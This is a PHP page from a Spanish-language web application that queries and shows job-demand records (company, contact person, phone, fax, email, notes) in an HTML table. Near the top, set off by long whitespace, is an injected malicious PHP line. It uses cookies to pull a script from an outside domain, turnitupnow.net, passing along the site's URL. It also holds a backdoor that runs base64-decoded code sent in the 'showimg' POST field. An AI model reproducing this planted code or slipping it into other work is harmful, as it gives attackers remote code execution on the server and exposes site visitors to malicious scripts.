<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="resources/estilos.css" rel="stylesheet" type="text/css">

				  <style type="text/css">
<!--
body {
	background-color: #F8F8F8;
}
-->
                  </style>
<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 
include_once("bdd.php");
$id = $_GET['id'];
$result = $db->Execute("SELECT CDE_cicleform.cicle, CDE_empresas.nombre, CDE_demandas.fecha, CDE_demandas.p_recoge, CDE_demandas.f_respuesta, CDE_demandas.p_responde, CDE_demandas.c_demanda, CDE_demandas.cargo, CDE_demandas.ciudad, CDE_demandas.provincia, CDE_demandas.t_demanda, CDE_demandas.fax_demanda, CDE_demandas.mail_demanda, CDE_demandas.contactar, CDE_demandas.llamar, CDE_demandas.colaborar, CDE_demandas.notas FROM CDE_demandas,CDE_cicleform,CDE_empresas WHERE (CDE_demandas.empresa = CDE_empresas.id) AND (CDE_demandas.cicle = CDE_cicleform.id) ORDER BY CDE_demandas.id");

	$a = $result->fields[0];
	$b = $result->fields[1];
	$c = $result->fields[2];
	$d = $result->fields[3];
	$e = $result->fields[4];
	$f = $result->fields[5];
	$g = $result->fields[6];
	$h = $result->fields[7];
	$i = $result->fields[8];
	$j = $result->fields[9];
	$k = $result->fields[10];
	$l = $result->fields[11];
	$m = $result->fields[12];
	$n = $result->fields[13];
	$o = $result->fields[14];
	$p = $result->fields[15];
	$q = $result->fields[16];


?>

<table width="500" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td width="291" height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Datos de la Demanda</td>
                    </tr>
                  </table>
				  <table width="500" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                    <tr>
                      <td width="95" height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Ciclo</td>
                      <td width="190" height="26" bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($a) ?></label>
                      </strong></td>
                      <td width="85" height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Ciudad</td>
                      <td width="130" height="26" bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($i) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Empresa</td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <?php echo utf8_encode($b) ?>
                        <label></label>
                      </strong></td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Provincia</td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($j) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Fecha</td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <?php echo utf8_encode($c) ?>
                        <label></label>
                      </strong></td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Teléfono</td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($k) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Quien atendio</td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <?php echo utf8_encode($d) ?>
                        <label></label>
                      </strong></td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Fax</td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($l) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;F. respuesta</td>
                    <td height="26" bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <?php echo utf8_encode($e) ?>
                        <label></label>
                      </strong></td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Email</td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($m) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Per. respondio</td>
                    <td height="26" bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <?php echo utf8_encode($f) ?>
                        <label></label>
                      </strong></td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Contactar</td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($n) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Contacto</td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <?php echo utf8_encode($g) ?>
                        <label></label>
                      </strong></td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Llamar</td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($o) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Cargo</td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <?php echo utf8_encode($h) ?>
                        <label></label>
                      </strong></td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Colaborar</td>
                      <td height="26" bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($p) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="22" bgcolor="#F8F8F8">&nbsp;<span class="texte_mini">Notas/Apuntes</span></td>
                      <td colspan="3" align="left" bgcolor="#F8F8F8"><label>
                        <textarea name="textfield" cols="60" rows="4" class="texte_mini" id="textfield14"><?php echo htmlentities($q) ?></textarea>
                      </label></td>
                    </tr>
                  </table>
				  